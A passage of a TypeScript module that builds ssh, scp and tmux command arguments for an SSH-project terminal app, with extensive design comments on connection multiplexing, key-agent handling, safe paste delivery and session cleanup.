// Pure ssh/tmux argv + remote-command builders for SSH projects. No electron/node-pty imports
// — unit-testable in isolation. The electron/spawn wiring lives in ssh-project.ts + pty-manager.
import os from 'os'
import path from 'path'
import { createHash } from 'crypto'
import {
  posixQuote,
  quoteRemotePath,
  remoteTmuxCommand,
  remoteTmuxPathPrologue,
  type SshConnection
} from '../../shared/ssh'
import {
  TMUX_SOCKET,
  assertPasteTarget,
  assertPasteBuffer,
  pasteBufferName,
  type PasteDelivery
} from '../tmux-naming'
import { sanitizePasteText } from '../paste-injection'
import { canControlCanvas } from '../../shared/agents/config'
import { COMBINED_PANE_MARKER, PANE_OWNER_FMT, PS_FOREGROUND_FLAGS } from '../agents/pane-owner'
// Dependency-free (no node-pty): safe to import from these pure builders.

/** Dedicated remote tmux socket so an SSH project never collides with the user's own tmux. */
export const RMT_TMUX_SOCKET = 'nodeterm-rmt'

/**
 * Every remote command that invokes `tmux` goes through this: the PATH-append prologue
 * (`remoteTmuxPathPrologue`, issue #449) plus the command. Without it a bare `tmux` dies with
 * `command not found` on any host whose ssh exec-channel PATH misses the install dir — most
 * visibly macOS with Homebrew's tmux in `/opt/homebrew/bin`. The prologue is one assignment, so
 * the command's own exit code (what `probeSaysAbsent` and every caller reads) is unchanged.
 */
function tmuxCmd(body: string): string {
  return `${remoteTmuxPathPrologue()}${body}`
}

/**
 * Per-project ControlMaster socket path. Deliberately SHORT and space-free. The macOS userData dir
 * (`~/Library/Application Support/<app>`) cannot host the socket: it both exceeds the unix-domain
 * socket `sun_path` limit (104 bytes — and ssh appends a ~17-char temp suffix while binding the
 * master, pushing a ~102-char path over) AND contains a space, which ssh's `-o ControlPath=` parser
 * rejects ("extra arguments at end of line"). Either makes the master silently fail to bind. So we
 * hash the project id to a fixed length under a short home dir (`~/.nodeterm/ssh-cm/`) — the master
 * socket then always binds, regardless of project id or platform userData location.
 */
export function controlPathFor(projectId: string): string {
  const id = createHash('sha256').update(projectId).digest('hex').slice(0, 16)
  return path.join(os.homedir(), '.nodeterm', 'ssh-cm', `${id}.sock`)
}

function target(conn: SshConnection): string {
  return `${conn.user}@${conn.host}`
}

function portArgs(conn: SshConnection): string[] {
  return ['-p', String(conn.port ?? 22)]
}

/**
 * `IdentitiesOnly=yes` + `-i` when the connection names a key, nothing otherwise. The pairing
 * exists because of `AddKeysToAgent` (masterArgs): an agent accumulates keys, and without
 * IdentitiesOnly ssh offers EVERY agent key before the configured one. Each rejected offer spends
 * one of the server's `MaxAuthTries` (default 6), so a well-stocked agent ended the connection
 * with "Too many authentication failures" before the configured key was ever offered (measured
 * against a real sshd: 8 junk agent keys plus `-i` = disconnected; the same with IdentitiesOnly
 * connects). IdentitiesOnly does NOT bypass the agent for the named key: ssh still has the agent
 * sign it, so the no-reprompt behavior survives (measured: askpass removed entirely, agent
 * holding the key, zero prompts). With NO configured key this must stay empty, because
 * IdentitiesOnly would then disable agent keys outright and break the very reconnect path
 * AddKeysToAgent provides.
 */
function identityArgs(conn: SshConnection): string[] {
  return conn.identityFile ? ['-o', 'IdentitiesOnly=yes', '-i', conn.identityFile] : []
}

/**
 * Honor a config-level `IdentityAgent SSH_AUTH_SOCK` (issue #427). When the `ssh -G` probe
 * (agent-probe.ts) determined that this host's effective config routes it at the ENVIRONMENT's
 * agent, pin the user's ambient login-agent socket on the command line: a command-line `-o` is
 * first-obtained, so it beats both the config line (which would re-read our overridden env and
 * land back on the app-private agent) and the env override itself. Empty for every connection the
 * probe did not mark — byte-identical legacy argv.
 */
function agentArgs(conn: SshConnection): string[] {
  return conn.identityAgentSock ? ['-o', `IdentityAgent=${conn.identityAgentSock}`] : []
}

/** Args for the backgrounded multiplexing master (the one auth happens here). */
export function masterArgs(conn: SshConnection, controlPath: string): string[] {
  const args = [
    '-M',
    '-N',
    '-o',
    'ControlMaster=auto',
    '-o',
    `ControlPath=${controlPath}`,
    '-o',
    'ControlPersist=300',
    '-o',
    'BatchMode=no',
    // Unknown host → record it and connect, instead of aborting. The master is backgrounded
    // (`-M -N`, no tty), so the default `StrictHostKeyChecking=ask` can never get its yes/no
    // answered and the whole connection fails — the "server not in known_hosts" error users hit.
    // `accept-new` auto-accepts a FIRST-SEEN host key (writing it to known_hosts) but STILL
    // refuses a host whose recorded key later CHANGED, so MITM protection on known hosts stays.
    '-o',
    'StrictHostKeyChecking=accept-new',
    // Keepalives on the ONE connection every terminal multiplexes over: keep NAT/firewall
    // entries warm, and detect a dead link in ~60s (15s × 4) instead of hanging half-dead
    // after sleep/wake or a network change. The client then exits 255 and the renderer's
    // SshReconnector takes over.
    '-o',
    'ServerAliveInterval=15',
    '-o',
    'ServerAliveCountMax=4',
    // Bound the TCP-connect phase. connect() waits on the master PROCESS for keyed connections
    // (a passphrase prompt can take minutes), so a black-holed TCP connect must fail through ssh
    // itself rather than ride that long window for the kernel's ~75s of SYN retries. Auth,
    // including the passphrase prompt, is not covered by ConnectTimeout, so no slow human is
    // ever cut off by this.
    '-o',
    'ConnectTimeout=15',
    // The master has no tty, so it can never complete password or keyboard-interactive auth: the
    // best it can do is submit an EMPTY credential, which OpenSSH does silently, once per allowed
    // prompt. Every connect against a password-auth host therefore produced several FAILED logins,
    // and because the app retries on its own timers (reconnector backoff, 45s watchdog, resume,
    // tab switches) a single evening was enough to trip the host's own fail2ban and lock the user
    // out with "Connection closed by <host>". Refusing both methods up front means the master
    // fails honestly on publickey alone and never spends a login attempt it cannot win.
    //
    // Do NOT express this as `NumberOfPasswordPrompts=0`: that counter also bounds the KEY
    // PASSPHRASE retry loop in OpenSSH's load_identity_file, so zero means an encrypted key is
    // tried once with an empty passphrase and then abandoned WITHOUT ever invoking SSH_ASKPASS.
    // It silently disables passphrase prompting altogether, which an end-to-end test against a
    // real sshd caught and no unit test could.
    '-o',
    'PasswordAuthentication=no',
    '-o',
    'KbdInteractiveAuthentication=no',
    // Load a successfully unlocked key into the agent named by SSH_AUTH_SOCK. An AGENT, not this
    // app, is the passphrase cache: the next master (reconnect, watchdog respawn) authenticates
    // through it and never re-prompts (measured against a real sshd: second connect, fresh master,
    // zero askpass invocations, even with SSH_ASKPASS removed), and the decrypted key sits in a
    // purpose-built process instead of a plaintext string in Electron main memory — which is why
    // the old in-app passphrase cache was deleted in its favor.
    //
    // WHICH agent is the app's choice, and it is not the user's: main points SSH_AUTH_SOCK at an
    // app-private agent it spawns and kills (src/main/remote-ssh/ssh-agent.ts), so the unlock is
    // scoped to one app run instead of living in the login agent until logout. Read that file
    // before assuming a key unlocked here survives a quit.
    //
    // Harmless when no agent is reachable at all: ssh skips the add silently (measured: not one
    // stderr line, so nothing for lastSshErrorLine to mistake for a failure cause) and simply
    // prompts again next time.
    //
    // OMITTED for a pinned-agent connection (agentArgs): there the designated agent is the user's
    // LOGIN agent, and forcing AddKeysToAgent=yes would load an askpass-unlocked key into it until
    // logout — the exact leak the app-private agent exists to close. The user's own ~/.ssh/config
    // decides for that host instead (and their key is normally already in that agent, which is why
    // they wrote `IdentityAgent SSH_AUTH_SOCK` in the first place).
    ...(conn.identityAgentSock ? [] : ['-o', 'AddKeysToAgent=yes']),
    ...agentArgs(conn),
    ...portArgs(conn),
    ...identityArgs(conn)
  ]
  args.push(target(conn))
  return args
}

/**
 * Args for a child ssh that reuses the master socket; `remote` is an optional remote command.
 *
 * `ControlMaster=auto`, NOT `no` — this is the self-heal half of the churn fix. With a live
 * master both behave identically (the child muxes over the socket, no new TCP/auth). But when
 * the master is gone and its socket file is absent, `no` made every child SILENTLY fall back to
 * a fresh direct connection — one full TCP+auth+close per poll (~2-3/s while the app is open;
 * a field report counted ~72k root logins in 24h on one host), invisible because everything
 * kept working. With `auto` + `ControlPersist`, the FIRST such child rebuilds a persistent
 * background master and every later child muxes over it. A leftover DEAD socket file still
 * blocks `auto` from binding (ssh refuses: "ControlSocket … already exists, disabling
 * multiplexing" → direct fallback), which is what the manager's watchdog exists for
 * (`ssh-project.ts` — periodic `-O check`, unlink stale socket, respawn master).
 */
export function childArgs(conn: SshConnection, controlPath: string, remote?: string): string[] {
  const args = [
    '-o',
    'ControlMaster=auto',
    '-o',
    `ControlPath=${controlPath}`,
    '-o',
    'ControlPersist=300',
    // Matters when this child is the one that actually touches the host (it became the master, or
    // fell back to a direct connection because the master was gone): a first-seen host key must be
    // recorded and accepted rather than abort a backgrounded, tty-less exec. See masterArgs.
    '-o',
    'StrictHostKeyChecking=accept-new',
    // Meaningful only when this child ends up owning the transport (became the master, or fell
    // back to a direct connection) — a mux client rides the master's keepalives. Same values as
    // masterArgs, for the same reason: detect a dead link in ~60s instead of hanging half-dead.
    '-o',
    'ServerAliveInterval=15',
    '-o',
    'ServerAliveCountMax=4',
    ...portArgs(conn)
  ]
  // The key matters exactly when mux is NOT available (fallback / becoming master) — the case
  // the old childArgs ignored: with a non-default identityFile every fallback exec failed auth.
  // identityArgs also pins the offer (IdentitiesOnly) so that same fallback cannot burn the
  // server's MaxAuthTries on unrelated agent keys; the agent still signs the pinned key, which
  // is the only way a tty-less child can use an ENCRYPTED key at all (it has no askpass wiring).
  // agentArgs matters in the same fallback case, for the same reason as masterArgs: the child's
  // env points at the app-private agent, and only the pin routes it back at the login agent the
  // user's config asked for.
  args.push(...agentArgs(conn))
  args.push(...identityArgs(conn))
  args.push(target(conn))
  if (remote !== undefined) args.push(remote)
  return args
}

export function checkMasterArgs(conn: SshConnection, controlPath: string): string[] {
  return ['-O', 'check', '-o', `ControlPath=${controlPath}`, ...portArgs(conn), target(conn)]
}
export function exitMasterArgs(conn: SshConnection, controlPath: string): string[] {
  return ['-O', 'exit', '-o', `ControlPath=${controlPath}`, ...portArgs(conn), target(conn)]
}
export function remoteTmuxHasSessionArgs(conn: SshConnection, controlPath: string, sessionId: string): string[] {
  return childArgs(conn, controlPath, tmuxCmd(`tmux -L ${RMT_TMUX_SOCKET} has-session -t ${sessionId}`))
}
/**
 * Every nodeterm tmux session on the host, by name.
 *
 * The host's own session list is the DURABLE record of which nodes run there. Our live pty map is
 * not: `PtyManager.kill()` forgets a session on detach, so a backgrounded project's nodes vanish
 * from it entirely — which is exactly the state the reconnect resync runs in. `list-sessions`
 * exits non-zero when no server is running; the caller reads that as "no sessions", not an error.
 * The format is single-quoted so `#{…}` reaches the remote tmux verbatim rather than being eaten
 * by the remote shell (same idiom as `remotePaneCommandArgs`).
 */
export function remoteListSessionsArgs(conn: SshConnection, controlPath: string): string[] {
  return childArgs(
    conn,
    controlPath,
    tmuxCmd(`tmux -L ${RMT_TMUX_SOCKET} list-sessions -F '#{session_name}'`)
  )
}

/** One session name per non-empty line. */
export function parseRemoteSessionNames(stdout: string): string[] {
  return stdout
    .split('\n')
    .map((line) => line.trim())
    .filter((line) => line.length > 0)
}

/**
 * Deliver text (and optionally Enter) into a node's REMOTE tmux session — the remote counterpart
 * of `PtyManager.sendText`'s local path (dictation insert, /rename, /branch, note pushes). ONE
 * remote command, so everything runs strictly in order on the remote host with no second network
 * round trip.
 *
 * THE TEXT IS NOT IN THIS ARGV. It rides the ssh child's STDIN into `tmux load-buffer -b … -`.
 * Two reasons, and both of them bit the previous version:
 *
 *  - ARG_MAX. `set-buffer -- "$text"` / `send-keys -l -- '<text>'` puts the whole payload in one
 *    argument, and a single argument is capped at MAX_ARG_STRLEN (128 KB). Measured locally: a
 *    300 KB payload dies with "Argument list too long"; the same payload through `load-buffer -`
 *    lands intact. A scrollback paste or a long note push is not a hypothetical size.
 *  - This repo's standing rule: no payload on a command line. It also retires the `posixQuote`
 *    of an attacker-influenced body into a remote shell line entirely — there is nothing left to
 *    quote.
 *
 * FRAMING is tmux's job now, not ours. See `localTmuxPasteArgs` for the whole measurement: the
 * old `#{bracket_paste_flag}` conditional needed tmux 3.7 on the REMOTE host and silently
 * degraded to a raw-newline mangle on every older one, while `paste-buffer -p` has consulted the
 * pane's real bracketed-paste state since tmux 1.7 (2012). The remote host's tmux version stops
 * being something this feature depends on.
 *
 * `sanitizePasteText` still runs — at the CALLER (`PtyManager.sendText`), once, for both paths,
 * on the bytes that go down stdin. tmux inserting the frame does not make a payload-supplied
 * `ESC[201~` harmless: it would still close the frame early and turn the rest into key input.
 *
 * The `#{pane_in_mode}` format and the inner `send-keys` command string are single-quoted so the
 * remote SHELL passes them through verbatim — `#…` at the start of a word is a comment to sh, and
 * the inner command is one tmux argument. `sessionId` is spliced unquoted, exactly as every
 * sibling builder here does, and that is safe only because `sessionName()` sanitises to
 * `[A-Za-z0-9_-]`; `localTmuxPasteArgs` asserts it for both paths (`assertPasteTarget`).
 */
export function remoteTmuxPasteArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string,
  buffer: string,
  enter: boolean
): string[] {
  assertPasteTarget(sessionId, buffer)
  const tmux = `tmux -L ${RMT_TMUX_SOCKET}`
  let cmd =
    `${tmux} load-buffer -b ${buffer} - ';' ` +
    `if-shell -F -t ${sessionId} '#{pane_in_mode}' 'send-keys -t ${sessionId} -X cancel' ';' ` +
    `paste-buffer -d -p -r -b ${buffer} -t ${sessionId}`
  if (enter) cmd += ` ';' send-keys -t ${sessionId} Enter`
  return childArgs(conn, controlPath, tmuxCmd(cmd))
}

/**
 * ── DELETED: `remoteTmuxFramedPasteArgs` / `remoteFramedDelivery` ───────────────────────────────
 *
 * The remote mirror of the framed-plan trio deleted in tmux-naming.ts — see the tombstone there
 * for the whole measurement (issue #453: tmux ≥ 3.7 passes paste-buffer content through vis(3),
 * so a payload-carried `ESC[200~` arrives as the literal text `^[[200~`). The SSH leg was the
 * WORSE case: the remote host's tmux is whatever the server runs, so the mangle appeared and
 * disappeared per host. The envelope now rides `remotePasteDelivery` above (`-p` + a separate
 * Enter, `PtyManager.sendEnvelope`), exactly like every other remote write.
 */

/**
 * A bare Enter into the remote pane — the remote half of `sendText`'s empty-payload case.
 *
 * It is not a special case invented here: `sendText('', { enter: true })` means "submit whatever
 * is composed", and the legacy two-step did exactly this (an empty literal send is a no-op, then
 * the Enter). It has to bypass `remoteTmuxPasteArgs` because `load-buffer -` given zero bytes
 * creates NO buffer, so the `paste-buffer` after it fails and tmux abandons the rest of the
 * command list — including the Enter. Measured.
 *
 * `sessionId` is spliced unquoted like every sibling, and — as of review — asserted like every
 * sibling. It was the one new builder in this change that opted out. Unreachable today, because
 * `sessionName()` sanitises to `[A-Za-z0-9_-]` before anything gets here, but a splice that is
 * safe only because some caller upstream happens to be strict is one refactor from an injection,
 * and this PR's own rule is that the guarantee lives at the splice.
 */
export function remoteTmuxEnterArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string
): string[] {
  assertPasteTarget(sessionId)
  return childArgs(conn, controlPath, tmuxCmd(`tmux -L ${RMT_TMUX_SOCKET} send-keys -t ${sessionId} Enter`))
}

/** `delete-buffer` on the REMOTE server — the sweep for a remote paste that never ran. */
export function remoteDeleteBufferArgs(
  conn: SshConnection,
  controlPath: string,
  buffer: string
): string[] {
  assertPasteBuffer(buffer)
  return childArgs(conn, controlPath, tmuxCmd(`tmux -L ${RMT_TMUX_SOCKET} delete-buffer -b ${buffer}`))
}

/**
 * The plan for a REMOTE delivery — the exact mirror of `localPasteDelivery`, and deliberately the
 * same three decisions (sanitize, empty body, per-call buffer) taken by calling the SAME code
 * rather than by writing them out again here. Drift between the two legs is how the ESC rule
 * survived being missing on one of them once already.
 */
export function remotePasteDelivery(
  conn: SshConnection,
  controlPath: string,
  sessionId: string,
  text: string,
  enter: boolean
): PasteDelivery | null {
  const body = sanitizePasteText(text)
  if (body.length === 0) {
    if (!enter) return null
    return { args: remoteTmuxEnterArgs(conn, controlPath, sessionId), body: '', cleanup: null }
  }
  const buffer = pasteBufferName()
  return {
    args: remoteTmuxPasteArgs(conn, controlPath, sessionId, buffer, enter),
    body,
    cleanup: remoteDeleteBufferArgs(conn, controlPath, buffer)
  }
}
/**
 * Did a FAILED `tmux has-session` probe actually say the session is absent? Only tmux's own
 * exit 1 ("can't find session" / "no server running") does. Anything else — ssh's 255 (a dead
 * or mid-reconnect ControlMaster), 127 (tmux off the remote PATH), a spawn error with no
 * numeric code — is a failed READ, and a failed read is never evidence of absence. Reading a
 * transport failure as "cold" made the desktop replay scrollback and type `claude --resume …`
 * into a LIVE fullscreen Claude session; the mangled line then landed in the agent's
 * conversation as a user prompt (field report). Unknown ⇒ warm attach, which types nothing.
 */
export function probeSaysAbsent(err: unknown): boolean {
  return (err as { code?: unknown } | null)?.code === 1
}
/**
 * Every tmux socket a nodeterm session can be living on, on ONE machine — used when we are asked to
 * end a session by NAME and do not know which socket holds it.
 *
 * Both exist on the same host all the time: `node-terminal` is what a nodeterm running ON that
 * machine uses (desktop or Server Edition), `nodeterm-rmt` is what a nodeterm SSH-ing INTO it uses.
 * The session-memory sweep lists both (`session-memory.ts`, `session-memory-remote.ts`) — so a kill
 * that only ever targeted one of them promised something it could not do for every row that came
 * off the other. That is not exotic: a host that runs its own `nodeterm-server` and is also SSH'd
 * into is exactly this shape.
 *
 * Deliberately NOT the same constant the sweep and the reaper use, even though it holds the same two
 * names: for THEM the order is load-bearing (the sweep's `bySession` is first-wins, so the order
 * decides which socket a duplicate name is attributed to), and for a kill it means nothing. Sharing
 * one array would silently couple a de-duplication preference to a kill list.
 */
export const KILL_TMUX_SOCKETS: readonly string[] = [TMUX_SOCKET, RMT_TMUX_SOCKET]

/**
 * Which local sockets a destroy must attempt.
 *
 * `liveSocket` is the socket of the session we actually HOLD, which we know is the right one: one
 * kill, and the fan-out below can never reach the ordinary path.
 *
 * With no live session the name is all we have, and then it depends on who is asking:
 *  - `everySocket: false` (the default, and every ordinary caller) → the local socket only. An
 *    ordinary node-× on a node that was never mounted in THIS process — the common case after an
 *    app restart — has no business speculating at `nodeterm-rmt`, which carries the sessions
 *    ANOTHER machine's nodeterm SSHed in to spawn here.
 *  - `everySocket: true` → every socket the name could be on. Only the session-memory panel's
 *    speculative kill asks for this, and it is the one caller that has earned it: the panel sweeps
 *    BOTH sockets, so an orphan row genuinely can be on either, and a kill aimed at one of them
 *    showed a confirm reading "this stops its tmux session" and then killed nothing at all.
 */
export function localKillSockets(
  liveSocket: string | null,
  everySocket = false
): readonly string[] {
  if (liveSocket) return [liveSocket]
  return everySocket ? KILL_TMUX_SOCKETS : [TMUX_SOCKET]
}

/**
 * `=` forces tmux to match the target EXACTLY. Without it tmux falls back to fnmatch and then to
 * PREFIX matching when the name is not found — and "not found" is the normal case for every kill we
 * fire speculatively at a socket. Node ids end in a counter (`term-<base36 ms>-1`), so `nt-…-1` is a
 * prefix of `nt-…-12`: a miss could kill a DIFFERENT session. The reaper already kills this way
 * (`session-budget.ts`) for the same reason.
 */
function exactTarget(sessionId: string): string {
  return `=${sessionId}`
}

/** Local `tmux kill-session` argv (the binary is resolved by the caller). */
export function localTmuxKillArgs(socket: string, sessionId: string): string[] {
  return ['-L', socket, 'kill-session', '-t', exactTarget(sessionId)]
}

export function remoteTmuxKillArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string,
  socket: string = RMT_TMUX_SOCKET
): string[] {
  return childArgs(conn, controlPath, tmuxCmd(`tmux -L ${socket} kill-session -t ${exactTarget(sessionId)}`))
}

/**
 * One kill per socket, for a caller that knows only the session NAME and does not know which socket
 * carries it — i.e. `SshProjectManager.killSessions({ everySocket: true })`, which is the
 * session-memory panel's route. Project deletion does NOT use this: it knows its own nodes, they
 * are all on the SSH project's own socket, and speculating at the host's `node-terminal` would aim
 * at sessions a nodeterm running ON that host owns.
 *
 * Best-effort by contract: tmux exits non-zero with "can't find session" on every socket that does
 * not hold it, and that is an expected, ignored outcome rather than a failure.
 */
export function remoteTmuxKillEverySocketArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string
): string[][] {
  return KILL_TMUX_SOCKETS.map((socket) => remoteTmuxKillArgs(conn, controlPath, sessionId, socket))
}
export function remoteCapturePaneArgs(conn: SshConnection, controlPath: string, sessionId: string, full: boolean): string[] {
  return childArgs(
    conn,
    controlPath,
    tmuxCmd(`tmux -L ${RMT_TMUX_SOCKET} capture-pane -p -e -t ${sessionId} -S ${full ? '-' : '-200'}`)
  )
}
/**
 * Ask the REMOTE tmux which command is in the foreground of a node's pane — the remote
 * counterpart of `PtyManager.paneCommand`'s local `display-message` path. The format is
 * single-quoted so `#{…}` survives the remote shell verbatim (same idiom as the
 * `#{pane_in_mode}` gate in `remoteTmuxPasteArgs`).
 */
export function remotePaneCommandArgs(conn: SshConnection, controlPath: string, sessionId: string): string[] {
  return childArgs(
    conn,
    controlPath,
    tmuxCmd(`tmux -L ${RMT_TMUX_SOCKET} display-message -p -t ${sessionId} '#{pane_current_command}'`)
  )
}

/** Ask remote tmux for the shell PID and current command as one parseable, bounded record. */
export function remotePaneProcessArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string
): string[] {
  return childArgs(
    conn,
    controlPath,
    tmuxCmd(`tmux -L ${RMT_TMUX_SOCKET} display-message -p -t ${sessionId} '#{pane_pid}|#{pane_current_command}'`)
  )
}

/** Read shell-formatted session environment from remote tmux for `PtyManager.envInfo`.
 * tmux emits `NAME="..."; export NAME;` for set vars and `unset NAME;` for removed vars. */
export function remoteShowEnvironmentArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string
): string[] {
  return childArgs(
    conn,
    controlPath,
    tmuxCmd(`tmux -L ${RMT_TMUX_SOCKET} show-environment -s -t ${sessionId}`)
  )
}

/**
 * SIGTERM the remote pane's foreground process group, after core has already confirmed tmux is
 * reporting an agent rather than a shell. The shell re-reads tpgid here to close the process-race
 * window and refuses its own group (`panePid`) before invoking kill.
 */
export function remoteTerminateForegroundArgs(
  conn: SshConnection,
  controlPath: string,
  panePid: number
): string[] {
  if (!Number.isSafeInteger(panePid) || panePid <= 0) {
    throw new Error('invalid-pane-pid')
  }
  return childArgs(
    conn,
    controlPath,
    `tpgid=$(ps -o tpgid= -p ${panePid} | tr -d '[:space:]') && ` +
      `case "$tpgid" in ''|*[!0-9]*) exit 1;; esac && ` +
      `[ "$tpgid" -gt 0 ] && [ "$tpgid" -ne ${panePid} ] && kill -TERM -- "-$tpgid"`
  )
}
/**
 * The ONE-round-trip remote pane-owner read (issue #460) — identity AND foreground `ps` in a
 * single ssh exec, replacing the two-trip pair below (tombstone).
 *
 * WHY one trip, measured: `deliverAgentMessage` bounds the whole read with
 * `PANE_PROBE_TIMEOUT_MS` (2s). Over a healthy mux channel each exec is ~100ms and two fit
 * easily — but when the master cannot serve a channel, `-o ControlMaster=auto` silently
 * "disables multiplexing" and every exec becomes a FULL ssh login. Measured on a real sshd with
 * its 64 `MaxSessions` exhausted by 70 held channels: the probe exec printed
 * `mux_client_request_session: session request failed: Session open refused by peer`, fell back
 * to a direct connection, and still exited 0 — at 258ms on loopback, i.e. 0.5–1.5s per exec over
 * a WAN. Two sequential fallback logins straddle the 2s budget, `probeWithin` answers null, and
 * the delivery gate refused a LIVE agent pane — persistently, for as long as the canvas held the
 * channels (field report: issue #460, on a host with 85 live `nt-` sessions). One trip halves
 * both the latency and the fallback-login count (the 72k-logins hazard the probe's own comment
 * warns about).
 *
 * Shape rules, each learned elsewhere in this repo:
 *  - the identity line is fenced by `COMBINED_PANE_MARKER`, printed through a QUOTED printf
 *    format — an unquoted word-initial `##` is an sh comment and prints an empty line
 *    (session-memory-remote's measured trap);
 *  - a failed tmux read `exit 9`s so the whole exec throws and the caller answers null — "no
 *    such session" must stay indistinguishable from the old first-trip failure;
 *  - the tty never crosses back into OUR command line: it is cut from the reply INSIDE the same
 *    shell (`${o#*|}`) and expanded quoted, with a `/dev/*` case guard, so there is nothing
 *    left for `isSafeTty` to defend at the splice (the parser still applies it to the reply);
 *  - a `ps` that errors prints nothing below the marker (`2>/dev/null || :`) — identity with no
 *    rows parses to null, exactly the two-trip contract;
 *  - the `ps` flags are `PS_FOREGROUND_FLAGS`, the same constant the local leg passes as argv,
 *    so the two legs cannot drift.
 */
export function remotePaneOwnerCombinedArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string
): string[] {
  // Every splice is checked at the splice (assertPasteTarget's own rule): the id is interpolated
  // unquoted into a script the remote login shell parses, so a name this app did not generate is
  // refused here rather than trusted to some caller's discipline.
  assertPasteTarget(sessionId)
  const ps = PS_FOREGROUND_FLAGS.join(' ')
  const script =
    `o=$(${tmuxCmd(`tmux -L ${RMT_TMUX_SOCKET} display-message -p -t ${sessionId} '${PANE_OWNER_FMT}'`)}) || exit 9; ` +
    `printf '%s\\n' "${COMBINED_PANE_MARKER.trimEnd()} $o"; ` +
    'tty=${o#*|}; tty=${tty%%|*}; ' +
    `case "$tty" in /dev/*) ps ${ps} -t "$tty" 2>/dev/null || : ;; esac`
  return childArgs(conn, controlPath, script)
}

/**
 * ── DELETED: `remotePaneOwnerArgs` / `remoteForegroundArgvArgs` ─────────────────────────────────
 *
 * The two-round-trip remote pane read. Replaced by `remotePaneOwnerCombinedArgs` above (issue
 * #460): under a saturated or dead ControlMaster each trip silently became a full ssh login, and
 * two of them could not fit the delivery gate's 2s probe budget — a live agent pane then read as
 * `unknown`, persistently. Do not resurrect the pair "for simplicity": the second trip is also a
 * second fallback LOGIN in exactly the degraded state that made the first one slow.
 */

/**
 * Ask the REMOTE tmux where a pane's cursor is — the remote counterpart of `PtyManager.paneCursor`,
 * and the thing that makes a refreshed SSH terminal land its cursor in the right place. Same
 * single-quoting rule as `remotePaneCommandArgs`: the `#{…}` fields have to reach the remote tmux
 * verbatim rather than being eaten by the remote shell. Space-separated so one `split` parses it.
 */
export function remotePaneCursorArgs(
  conn: SshConnection,
  controlPath: string,
  sessionId: string
): string[] {
  return childArgs(
    conn,
    controlPath,
    tmuxCmd(`tmux -L ${RMT_TMUX_SOCKET} display-message -p -t ${sessionId} '#{cursor_x} #{cursor_y} #{cursor_flag}'`)
  )
}
export function tmuxProbeArgs(conn: SshConnection, controlPath: string): string[] {
  return childArgs(conn, controlPath, tmuxCmd('command -v tmux'))
}
export function listDirArgs(conn: SshConnection, controlPath: string, path: string): string[] {
  return childArgs(conn, controlPath, `ls -1Ap ${quoteRemotePath(path)}`)
}

/** Create a remote directory (and any missing parents). `quoteRemotePath` keeps a leading `~`. */
export function mkDirArgs(conn: SshConnection, controlPath: string, path: string): string[] {
  return childArgs(conn, controlPath, `mkdir -p ${quoteRemotePath(path)}`)
}

/** scp argv that reuses the project's ControlMaster. `localPath` is a raw local arg; the absolute
 *  `remotePath` is passed RAW (NOT posixQuote'd). Modern scp (OpenSSH 9+) uses the SFTP protocol by
 *  default and does NOT run the remote path through a shell — it opens the literal string after the
 *  `host:`, so a quoted path makes the SFTP server look for a file literally named `'…'` (the upload
 *  then silently fails). Leaving it raw means SFTP opens the exact absolute path (spaces and all);
 *  there is no remote shell, so no quoting is needed and no injection is possible (`fileName` is also
 *  basenamed by the caller, and the path is absolute). scp uses `-P` (uppercase) for the port. */
export function scpArgs(conn: SshConnection, controlPath: string, localPath: string, remotePath: string): string[] {
  const args = ['-o', 'ControlMaster=no', '-o', `ControlPath=${controlPath}`, '-o', 'BatchMode=yes', '-P', String(conn.port ?? 22)]
  args.push(...agentArgs(conn))
  args.push(...identityArgs(conn))
  args.push(localPath, `${conn.user}@${conn.host}:${remotePath}`)
  return args
}

/**
 * The remote side of an scp argument. A `~`-prefixed path (SSH projects default to a home-relative
 * `remoteCwd`, so the Explorer's paths inherit it) must NOT travel as a literal `~`: modern scp
 * speaks SFTP with no remote shell to expand it, and the transfer would fail looking for a
 * directory actually named `~`. A RELATIVE path is the portable answer — SFTP resolves it against
 * the login directory, and legacy (shell-mode) scp lands in the same place.
 */
export function remoteScpPath(p: string): string {
  if (p === '~') return '.'
  return p.startsWith('~/') ? p.slice(2) : p
}

/**
 * scp argv that pulls `remotePath` DOWN to `localPath` over the project's ControlMaster — the
 * mirror of `scpArgs`. `-r` copies a directory tree. Direction is the only real difference: the
 * remote path is still passed raw after `host:` (see scpArgs — quoting it would make the SFTP
 * server look for a literally-quoted name), and it can never be read as an option because it is
 * concatenated behind `user@host:`. `localPath` is built by MAIN (never a renderer string), so
 * the flag-smuggling guard that `uploadFile` needs has no counterpart here.
 */
export function scpDownArgs(
  conn: SshConnection,
  controlPath: string,
  remotePath: string,
  localPath: string,
  recursive = false
): string[] {
  const args = ['-o', 'ControlMaster=no', '-o', `ControlPath=${controlPath}`, '-o', 'BatchMode=yes', '-P', String(conn.port ?? 22)]
  args.push(...agentArgs(conn))
  args.push(...identityArgs(conn))
  if (recursive) args.push('-r')
  args.push(`${conn.user}@${conn.host}:${remoteScpPath(remotePath)}`, localPath)
  return args
}

/**
 * Reverse-forward the local hook server's loopback TCP port to a remote unix socket over the
 * existing master (`ssh -O forward -R <remoteSock>:127.0.0.1:<hookPort>`), so remote hook scripts
 * can POST to it via `curl --unix-socket`.
 */
function fwdSpec(remoteSock: string, hookPort: number): string {
  return `${remoteSock}:127.0.0.1:${hookPort}`
}
export function hookForwardArgs(conn: SshConnection, controlPath: string, remoteSock: string, hookPort: number): string[] {
  return ['-O', 'forward', '-R', fwdSpec(remoteSock, hookPort), '-o', `ControlPath=${controlPath}`, ...portArgs(conn), target(conn)]
}
export function hookForwardCancelArgs(conn: SshConnection, controlPath: string, remoteSock: string, hookPort: number): string[] {
  return ['-O', 'cancel', '-R', fwdSpec(remoteSock, hookPort), '-o', `ControlPath=${controlPath}`, ...portArgs(conn), target(conn)]
}
/**
 * tmux `-e KEY=VALUE` pairs injecting the remote hook endpoint file + node id + protocol version,
 * plus the agent identity. The identity pair matters: the local path's `hookServer.buildPtyEnv`
 * sets NODETERM_AGENT_ID and gates NODETERM_CANVAS_CONTROL on `canControlCanvas`, and a remote
 * session that inherited neither had the canvas-control CLI disable itself on its own env gate —
